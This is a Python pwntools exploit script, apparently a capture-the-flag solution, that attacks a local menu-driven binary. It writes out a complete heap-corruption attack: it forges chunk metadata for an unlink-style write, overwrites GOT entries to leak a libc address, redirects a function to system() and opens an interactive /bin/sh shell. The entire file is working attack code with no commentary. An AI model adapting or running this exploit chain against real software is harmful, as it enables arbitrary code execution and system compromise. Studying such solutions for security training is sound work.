#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./binary"
ENV = {"LD_PRELOAD":"./libc.so.6"}

p = process(elf)

def read(idx, s):
    p.recvuntil("Which? :")
    p.sendline("1")
    p.recvuntil("Which? :")
    p.sendline(str(idx))
    p.recvuntil("msg:")
    p.sendline(s)

def edit(idx, s):
    p.recvuntil("Which? :")
    p.sendline("2")
    p.recvuntil("Which? :")
    p.sendline(str(idx))
    p.recvuntil("new msg:")
    p.send(s)

def wipe(idx):
    p.recvuntil("Which? :")
    p.sendline("3")
    p.recvuntil("Which? :")
    p.sendline(str(idx))


read(0, "a"*0x11f)
wipe(0)
read(3, "a"*0xcb)
read(4, "a"*0x14b)

payload = p64(0)+p64(0x91)
payload += p64(0x602180)
payload += p64(0x602188)
payload += p8(0)*(0x90-len(payload))
payload += p64(0x90)
payload += "\n"
edit(3, payload)
wipe(4)

read(0, "a"*0x1f)
read(1, "a"*0x1f)
edit(1, "/bin/sh\n")

edit(3, "\x28\x20\x60\n")

# write puts_plt to strlen_got 
edit(0, "\x70\x07\x40\x00\x00\n")

edit(3, "\x18\x20\x60\n")

p.recvuntil("Which? :")
p.sendline("2")
p.recvuntil("Which? :")
p.sendline(str(0))
p.recvuntil("new msg:")

libc_base = u64(p.recv(6).ljust(8,"\x00"))-0x844f0
log.info("libc_base: "+hex(libc_base))

system_addr = libc_base+0x45390

payload = p32(system_addr%0x100000000)
payload += p16(system_addr/0x100000000)
p.sendline(payload)

wipe(1)

p.interactive()
